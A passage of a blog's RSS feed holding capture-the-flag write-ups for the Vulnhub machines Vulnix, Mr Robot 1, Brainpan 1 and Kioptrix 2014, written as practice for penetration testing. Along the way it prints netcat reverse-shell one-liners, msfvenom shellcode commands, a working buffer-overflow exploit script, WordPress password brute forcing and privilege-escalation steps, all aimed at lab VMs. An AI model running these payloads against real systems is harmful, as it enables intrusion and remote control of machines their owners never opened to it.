I added the /root directory to the exports file with the “no_root_squash” flag enabled, which means that if we use the root user in our machine we can work as root in the directory shared with NFS (root_squash means that NFS ignores the requests made by root). 
&lt;img src=&quot;newExports.png&quot; alt=&quot;New exports&quot; /&gt;
To use the changes made in the exports file we need to restart the NFS service but we don’t have permission to do so and I got stuck here for a long time. Eventually I gave up and looked for some hints on the Internet, just to find that everyone restarted the VM to restart the service. I did so and I got access to the /root directory with root privileges. I knew that root login was enabled in the /etc/sshd_config file, so I used the same method as before to get SSH access.
&lt;img src=&quot;SSHConfig.png&quot; alt=&quot;SSH Config&quot; /&gt;
&lt;img src=&quot;showmount2.png&quot; alt=&quot;Showmount 2&quot; /&gt;
&lt;img src=&quot;mountRoot.png&quot; alt=&quot;Mount root&quot; /&gt;
&lt;img src=&quot;privesc.png&quot; alt=&quot;PrivEsc&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This is a fairly difficult machine due to the amount of rabbit holes it has and the fact that you need to know a bit about NFS (and do some research on it) to get root (and user if you are too impatient). I didn’t like the part about restarting the VM because it isn’t something that you can do on a remote machine but overall this has been a really good learning experience.&lt;/p&gt;
</description>
        <pubDate>Sat, 08 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/hacklab_vulnix_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/hacklab_vulnix_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Mr Robot: 1 Write-Up</title>
        <description>&lt;p&gt;MrRobot 1 is an intermediate OSCP-like machine (according to the &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot;&gt;Abatchy’s list&lt;/a&gt;) hosted on Vulnhub. This machine is a little bit different from the other ones, in this one the goal is to read the three hidden keys in the machine.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
&lt;img src=&quot;netScan.png&quot; alt=&quot;NetScan&quot; /&gt;
The IP of the target machine is 192.168.56.132.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;PortScan&quot; /&gt;
There are only two ports open (80 and 443) and both of them host the same webpage.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
&lt;p&gt;The root page has an interactive MrRobot themed page but it doesn’t lead to anything useful. Nikto found that the site has WordPress 4.3.1 installed and I found some entries inside the robots.txt file.
&lt;img src=&quot;nikto.png&quot; alt=&quot;Nikto Output&quot; /&gt;
&lt;img src=&quot;robots.png&quot; alt=&quot;Robots.txt&quot; /&gt;
The key-1-of-3.txt file contains the first key while fsocity.dic is a dictionary with some repetitions. I removed the repetitions using “cat port80/fsocity.dic | sort | uniq &amp;gt; port80/fsocityFilt.dic”
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;WordPress Bruteforce&lt;/h1&gt;
&lt;p&gt;I noticed that the WordPress login page error message was “Invalid username”, so I tried to bruteforce the username using Hydra. To do so I used the Network Firefox utility to get the necessary parameters to login.
&lt;img src=&quot;postParams.png&quot; alt=&quot;POST Parameters&quot; /&gt; 
&lt;img src=&quot;invalidUser.png&quot; alt=&quot;Invalid username message&quot; /&gt;
&lt;img src=&quot;hydra1.png&quot; alt=&quot;Hydra User Bruteforce&quot; /&gt;
Hydra found the “Elliot” username, so I tried to bruteforce his password using the fsocity dictionary.
&lt;img src=&quot;invalidPass.png&quot; alt=&quot;Invalid password message&quot; /&gt;
&lt;img src=&quot;hydra2.png&quot; alt=&quot;Hydra Password Bruteforce&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;WordPress Access&lt;/h1&gt;
&lt;p&gt;Using the credentials found with Hydra I logged in as Elliot, who has Administrator privileges.
&lt;img src=&quot;wordpressUsers.png&quot; alt=&quot;WordPress Users&quot; /&gt;
With the Administrator privileges we can simply edit a php file of the template with a simple php shell (I used 404.php because it is easy to get it executed). I also found that we can upload a malicious plugin or try to use both CVE-2019-8942 and CVE-2019-8943 to get RCE (I wasn’t able to exploit them).
&lt;img src=&quot;404Edit.png&quot; alt=&quot;Editing 404&quot; /&gt;
Once I had the simple shell I executed “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.56.10 1234 &amp;gt;/tmp/f” to get a reverse shell.
&lt;img src=&quot;revShell1.png&quot; alt=&quot;Reverse shell 1&quot; /&gt;
&lt;img src=&quot;revShell2.png&quot; alt=&quot;Reverse shell 2&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Daemon Shell&lt;/h1&gt;
&lt;p&gt;I found the second key and a MD5 hash inside the /home/robot/ directory, but the key wasn’t readable with my user, so I used hashcat to crack the hash.
&lt;img src=&quot;lsRobotHome.png&quot; alt=&quot;ls /home/robot/&quot; /&gt;
&lt;img src=&quot;passwordMD5.png&quot; alt=&quot;password.raw-md5&quot; /&gt;
&lt;img src=&quot;hashcat.png&quot; alt=&quot;Hashcat cracking&quot; /&gt;
Hashcat cracked the hash successfully, giving us the password “abcdefghijklmnopqrstuvwxyz”.&lt;/p&gt;
&lt;h1&gt;Robot Shell and Privesc to Root&lt;/h1&gt;
&lt;p&gt;Using “su robot” with the “abcdefghijklmnopqrstuvwxyz” password I got access to the robot user. Running LinEnum I saw that Nmap was installed in the machine and that it had the SetUID bit enabled. Nmap has an interactive mode, so I used it to get a shell with an efective user id of 0 (root). I know that there are methods to get UID == 0, but having only the EUID was fine for me. The last key was inside /root/.
&lt;img src=&quot;privesc.png&quot; alt=&quot;PrivEsc to root&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;This is a really straightforward machine if you know what are you doing, so I don’t really get why it is rated as intermediate. Nevertheless, it is a funny machine to root, even though it is a little bit too CTF-like for me.&lt;/p&gt;
</description>
        <pubDate>Wed, 05 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/mrrobot_1_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/mrrobot_1_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Brainpan: 1 Write-Up</title>
        <description>&lt;p&gt;Brainpan 1 is an intermediate OSCP-like machine hosted on Vulnhub which features a Windows x86 buffer overflow as the foothold.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
&lt;img src=&quot;netScan.png&quot; alt=&quot;NetScan&quot; /&gt;
The IP of the target machine is 192.168.56.131, as .10 is my machine.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;PortScan&quot; /&gt;
This time there are two services listening in strange ports, so I used the default NSE scripts to gather more information about them.
&lt;img src=&quot;port9999NSE.png&quot; alt=&quot;Port 9999 NSE&quot; /&gt;
&lt;img src=&quot;port10000NSE.png&quot; alt=&quot;Port 10000 NSE&quot; /&gt;
Port 9999 has an unknown application which asks for a password, while port 10000 is a Python SimpleHTTPServer.&lt;/p&gt;
&lt;h1&gt;Port 10000 Enumeration&lt;/h1&gt;
&lt;p&gt;In the root page we get an image with some good coding practices.
&lt;img src=&quot;rootPage.png&quot; alt=&quot;Root web page&quot; /&gt;
I couldn’t find anything interesting while enumerating manually, but Gobuster found a directory.
&lt;img src=&quot;gobuster.png&quot; alt=&quot;Gobuster&quot; /&gt;
The bin directory has directory listing enabled and from there we can download a Windows executable.
&lt;img src=&quot;binDirectory.png&quot; alt=&quot;Bin dir&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Brainpan.exe and Obtaining a Shell&lt;/h1&gt;
&lt;p&gt;Brainpan.exe is the program that is listening on port 9999 on the target machine.
&lt;img src=&quot;execBrain.png&quot; alt=&quot;Exec brain 1&quot; /&gt;
&lt;img src=&quot;execBrain2.png&quot; alt=&quot;Exec brain 2&quot; /&gt;
I attempted to bruteforce the password while I was examining the code using OllyDbg.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pass &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;test.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; | nc localhost 9999 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ACCESS DENIED&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;then
                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; works!
                &lt;span class=&quot;nb&quot;&gt;exit
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I found the password when I was reading the get_reply function (the string that is being passed as a parameter to strcmp), but using it didn’t do anything. I also noticed that the program uses the strcpy function, which is unsafe.
&lt;img src=&quot;ollyDBGCode.png&quot; alt=&quot;Olly Code&quot; /&gt;
I used msf-pattern_create to generate a pattern with 1000 characters to test if the application crashes and then I used msf-pattern_offset to get the exact position.
&lt;img src=&quot;BOFTest1.png&quot; alt=&quot;BOF Test 1&quot; /&gt;
&lt;img src=&quot;BOFTest2.png&quot; alt=&quot;BOF Test 2&quot; /&gt; 
&lt;img src=&quot;BOFTest3.png&quot; alt=&quot;BOF Test 3&quot; /&gt;
To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a “JMP esp” instruction at 0x311712F3, which means that we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn’t know how to do this with OllyDbg and I didn’t have a Windows VM prepared).&lt;br /&gt;
I generated two shellcodes, one for Windows and the other one for Linux using msfvenom.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.10 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; shellcode &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 –platform Windows &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Windows shellcode&lt;/span&gt;
msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.10 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; shellcode &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 –platform Linux &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Linux shellcode&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At first the shellcode didn’t execute properly, so I searched on the Internet and I found the NOP Sled technique, which consists in placing some NOP instructions before the shellcode to try to ensure that the shellcode will be executed completely. Using 16 NOPs (0x90) makes the shellcode work properly.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Linux shellcode generated using msf-venom
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;b&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xda\xd1\xd9\x74\x24\xf4\x58\xbb\x3d\xfb\x67&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3e\x2b\xc9\xb1\x12\x31\x58\x17\x83\xe8\xfc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\x65\xe8\x85\xcb\xa4\xd5\xbd\xd7\x95\xaa&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x12\x72\x1b\xa4\x74\x32\x7d\x7b\xf6\xa0\xd8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x33\xc8\x0b\x5a\x7a\x4e\x6d\x32\xbd\x18\xb5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8\x55\x5b\xc6\xc8\x77\xd2\x27\x60\x11\xb5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf6\xd3\x6d\x36\x70\x32\x5c\xb9\xd0\xdc\x31&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x95\xa7\x74\xa6\xc6\x68\xe6\x5f\x90\x94\xb4&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                                         
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc\x2b\xbb\x88\xf8\xe6\xbc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Junk bytes to fill the buffer
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;524&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Address of the JMP esp instruction
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x311712F3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Payload with 16 NOPs
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retAddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine, so I knew that it would work).
&lt;img src=&quot;remoteShell1.png&quot; alt=&quot;Remote shell 1&quot; /&gt;
&lt;img src=&quot;remoteShell2.png&quot; alt=&quot;Remote shell 2&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running sudo -l we can see that puck can run a script as root without suppling the password. This script has three functions (network, proclist and manual). The manual function runs the man command with the argument that we supply.
&lt;img src=&quot;sudoPuck.png&quot; alt=&quot;Sudo -l&quot; /&gt;
&lt;img src=&quot;functions.png&quot; alt=&quot;Functions&quot; /&gt;
The man command uses a pager to show the manual and this pager allows us to run commands. I won’t explain the method but &lt;a href=&quot;https://gtfobins.github.io/gtfobins/man/&quot;&gt;I’ll leave a link to it&lt;/a&gt;.
&lt;img src=&quot;privesc.png&quot; alt=&quot;privesc&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;This is a really fun and a bit difficult machine that helped me practising buffer overflow. I’ve learnt about the NOP sled technique and the importance of having a Windows VM to test programs in there (I’ll work on this in the future).&lt;/p&gt;
</description>
        <pubDate>Mon, 03 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/brainpan_1_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/brainpan_1_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Kioptrix: 2014 Write-Up</title>
        <description>&lt;p&gt;Kioptrix: 2014 is an intermediate OSCP-like machine hosted on Vulnhub and the fifth one in the Kioptrix series.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;To get the IP of the machine I used Nmap’s ping scan to sweep the network.
&lt;img src=&quot;networkScan.png&quot; alt=&quot;Network Scan&quot; /&gt;
192.168.56.10 is the IP of my machine, so 192.168.56.130 is the target.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan and NSE Output&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;Port Scan&quot; /&gt;
There are three ports in the port scanning results, but only 80 and 8080 are open.
&lt;img src=&quot;NSEOut.png&quot; alt=&quot;NSE Out&quot; /&gt;
Here we can see that the machine is using FreeBSD and the webserver has mod_ssl 2.2.21, which was vulnerable in another machine in the Kioptrix series (the exploit didn’t work this time).
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
&lt;p&gt;In the root page of the web server we can see that the server is hosting pChart 2.1.3, which is a php webapp to make charts and it is &lt;a href=&quot;https://www.exploit-db.com/exploits/31173&quot;&gt;vulnerable to LFI&lt;/a&gt;.
&lt;img src=&quot;rootPage80.png&quot; alt=&quot;Root page 80&quot; /&gt;
Using the example HTTP request on ExploitDB I could read the /etc/passwd file but I didn’t find anything interesting there (except that there is a HIDS installed).&lt;br /&gt;
After modifying the HTTP request I read the configuration files for both the SSHD and the Apache services.
&lt;img src=&quot;LFIpasswd.png&quot; alt=&quot;LFI passwd&quot; /&gt;
&lt;img src=&quot;aconfigloc.png&quot; alt=&quot;Apache config location&quot; /&gt;
In the Apache configuration file we can see that the port 8080 virtual host only accepts connections that have the “UserAgent” header field set to “Mozilla/4.0”.
&lt;img src=&quot;aconfigcode.png&quot; alt=&quot;Apache config code&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Port 8080 Enumeration&lt;/h1&gt;
&lt;p&gt;I used the BurpSuite proxy to rewrite the UserAgent of all my requests to enumerate manually the port 8080 virtual host. 
&lt;img src=&quot;phptax.png&quot; alt=&quot;Php Tax is installed&quot; /&gt;
PhpTax is installed in the server and it has a &lt;a href=&quot;https://www.exploit-db.com/exploits/21665&quot;&gt;Remote Code Execution (RCE) vulnerability&lt;/a&gt;. I couldn’t find the installed version (I didn’t install it in my machine to check the files) but I found that the vulnerability was working after doing some tweaks to the HTTP request.&lt;/p&gt;
&lt;h1&gt;RCE Exploitation&lt;/h1&gt;
&lt;p&gt;To exploit the RCE I used a one liner to spawn a reverse shell using nc:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 192.168.56.10 1234 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;revShell1.png&quot; alt=&quot;Reverse Shell 1&quot; /&gt;
&lt;img src=&quot;revShell2.png&quot; alt=&quot;Reverse Shell 2&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running uname I found that the machine was using FreeBSD 9.0, which has two registered kernel exploits in ExploitDB. 
&lt;img src=&quot;kernel.png&quot; alt=&quot;Kernel exploit&quot; /&gt;
I used the second one, to get it I runned “searchsploit -m exploits/freebsd/local/26368.c” in my local machine and then I uploaded it using nc, as wget and curl weren’t installed in the target. The commands I used were:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;(Local) nc -lnvp 5678 &amp;lt; exploit.c #Used to setup the server&lt;/li&gt;
  &lt;li&gt;(Target) nc 192.168.56.10 5678 &amp;gt; exploit.c #Connect to the server and save the output to exploit.c
Finally I compiled it and executed it in the target machine.
&lt;img src=&quot;root.png&quot; alt=&quot;PrivEsc to Root&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;I found this machine pretty easy, maybe because I had solved similar machines in the past. It was really frustating to use the reverse shell as the machine didn’t have Python installed and I couldn’t upgrade it to a more interactive shell. Fortunatelly the privilege escalation part was only executing a kernel exploit and it didn’t require much work on the remote machine.&lt;br /&gt;&lt;br /&gt;
I’ve been practising buffer overflow and I’ve done some HackTheBox write-ups (I can’t upload them right now because the machines are still active), this is why I didn’t post anything in such a long time.&lt;/p&gt;
</description>
        <pubDate>Fri, 31 Jul 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/kioptrix_2014_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/kioptrix_2014_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
  </channel>
</rss>
